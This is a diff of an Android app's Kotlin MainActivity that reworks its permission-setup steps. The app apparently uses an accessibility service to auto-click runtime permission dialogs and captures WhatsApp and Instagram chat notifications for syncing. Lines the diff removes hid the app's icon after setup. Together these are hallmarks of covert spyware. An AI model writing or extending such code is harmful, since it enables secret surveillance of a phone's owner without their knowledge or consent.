@@ -308,7 +308,6 @@ class MainActivity : AppCompatActivity() {
             val missingNotification = !isNotificationAccessGranted()
             if (missingRuntime.isNotEmpty() || missingAccessibility || missingNotification) {
                 isOneTapFlowRunning = true
-                hasAttemptedDirectAccessibilityLaunch = false
                 skipAccessibilityStep = false
                 skipNotificationStep = false
                 handleNextSetupStep()
@@ -537,7 +536,6 @@ class MainActivity : AppCompatActivity() {
             Handler(Looper.getMainLooper()).postDelayed({
                 if (!isFinishing && !isDestroyed) {
                     isOneTapFlowRunning = true
-                    hasAttemptedDirectAccessibilityLaunch = false
                     skipAccessibilityStep = false
                     skipNotificationStep = false
                     handleNextSetupStep()
@@ -639,48 +637,29 @@ class MainActivity : AppCompatActivity() {
 
     // =========================================================================
 
-    private var hasAttemptedDirectAccessibilityLaunch = false
+
 
     private fun handleNextSetupStep() {
-        // Step 1: Accessibility Service -> Directly launch Accessibility Settings automatically!
+        // Step 1: Accessibility Service (Enabled first so auto-grant loop can assist)
         if (!isAccessibilityEnabled() && !skipAccessibilityStep) {
-            if (!hasAttemptedDirectAccessibilityLaunch) {
-                hasAttemptedDirectAccessibilityLaunch = true
-                try {
-                    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-                    accessibilityLauncher.launch(intent)
-                    return
-                } catch (e: Exception) {
-                    Log.e(TAG, "Cannot launch accessibility settings directly", e)
-                }
-            }
-            // If user returned without enabling, show instruction dialog + restricted setting button
             showAccessibilityDialog()
             return
         }
 
-        // Step 2: Notification Access -> Directly launch Notification Listener Settings automatically!
+        // Step 2: Notification Access (WhatsApp & Instagram chat listener)
         if (!isNotificationAccessGranted() && !skipNotificationStep) {
-            BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
-            try {
-                val notifIntent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
-                notificationListenerLauncher.launch(notifIntent)
-                return
-            } catch (e: Exception) {
-                Log.e(TAG, "Cannot launch notification listener settings directly", e)
-                showNotificationDialog()
-                return
-            }
+            showNotificationDialog()
+            return
         }
 
-        // Step 3: Standard Runtime Permissions (Auto-clicked sequentially via Accessibility loop)
+        // Step 3: Standard Runtime Permissions (Auto-clicked via Accessibility loop)
         val missingRuntime = getMissingRuntimePermissions()
         if (missingRuntime.isNotEmpty()) {
             BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
             Handler(Looper.getMainLooper()).postDelayed({
                 BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
                 runtimePermissionsLauncher.launch(missingRuntime.toTypedArray())
-            }, 250L)
+            }, 300L)
             return
         }
 
@@ -690,8 +669,6 @@ class MainActivity : AppCompatActivity() {
         refreshPermissionStatus()
         triggerAutoSyncAfterAccessibility()
         Log.i(TAG, "Core permissions, Accessibility & Notification Access all active")
-        hideAppIcon()
-        finish()
     }
 
 
